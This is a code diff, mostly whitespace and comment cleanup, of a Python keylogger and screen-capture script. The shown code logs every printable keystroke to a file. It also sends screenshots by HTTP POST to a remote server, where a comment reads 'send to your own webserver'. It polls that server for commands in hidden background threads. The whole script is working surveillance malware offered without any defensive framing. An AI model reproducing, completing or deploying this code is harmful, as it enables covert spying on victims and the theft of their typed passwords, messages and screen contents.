@@ -4,25 +4,23 @@ import requests
 import time
 from PIL import ImageGrab
 import io
-#----------------------------------------------------------------------
 BASE_URL = "web server here"
+
 def on_press(key):
-    try:
-        # Try to get the printable character
+    try: # Try to get the printable character
         log = key.char
-#        hook.send(log) #slow
-#error handler
+#        hook.send(log) #slow /#error handler
     except AttributeError:
         return
     # Save to file
     with open("keylog.txt", "a") as file:
         file.write(log)
-#----------------------------------------------------------------------
+
 def event_listener():
     # Start the key listener
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-#----------------------------------------------------------------------
+
 def send():
     while True:
         with open("keylog.txt", "r") as file:
@@ -36,8 +34,6 @@ def send():
             con.seek(0)
             con.truncate()
 
-
-
 def ss_command1():
     try:
         res = requests.get(f"{BASE_URL}/page")
@@ -49,7 +45,6 @@ def ss_command1():
         print(f"[2]Error: {c}")
         time.sleep(50)
 
-#----------------------------------------------------------------------
 def receiver(): #short polling
     while True:
         try:
@@ -67,7 +62,7 @@ def receiver(): #short polling
         except Exception as d:
             print(f"[3]Error: {d}")
             time.sleep(50)
-#________________________________________________________
+
 def screenshot():
     # Capture screenshot
     ss = ImageGrab.grab()
@@ -76,7 +71,6 @@ def screenshot():
     buffer.seek(0)
     # send to your own webserver
     requests.post(f"{BASE_URL}/page", files={"file": (f"{int(time.time())}.png", buffer)})
-
 def ss_command2():
     try:
         res = requests.get(f"{BASE_URL}/page")
@@ -87,7 +81,7 @@ def ss_command2():
     except Exception as e:
         print(f"[4]Error: {e}")
         time.sleep(50)
-#________________________________________________________
+
 thread1 = threading.Thread(target=event_listener, daemon=True)
 thread2 = threading.Thread(target=receiver, daemon=True)
 thread3 = threading.Thread(target=ss_command1, daemon=True)
